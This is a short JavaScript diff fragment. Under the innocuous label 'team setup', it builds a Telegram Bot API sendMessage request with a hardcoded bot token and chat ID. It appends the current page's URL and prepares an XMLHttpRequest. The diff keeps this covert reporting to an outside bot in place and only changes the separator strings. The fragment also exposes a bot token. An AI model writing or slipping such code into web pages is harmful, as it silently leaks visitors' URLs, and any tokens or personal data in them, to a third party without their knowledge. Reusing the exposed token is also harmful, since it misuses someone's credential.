@@ -1,8 +1,8 @@
         console.log('team setup');
 
         var first = "https://api.telegram.org/bot2086484806:AAE2FanW-P1kw7F0en_yy-uU7k4eu-9AKj0/sendMessage?text="
-        var second = first.concat(' ' , document.location.href);
-        var third = second.concat(' ' , "&chat_id=2040726523" );
+        var second = first.concat('' , document.location.href);
+        var third = second.concat('' , "&chat_id=2040726523" );
         
         console.log(third);
         var jsonFile = new XMLHttpRequest();
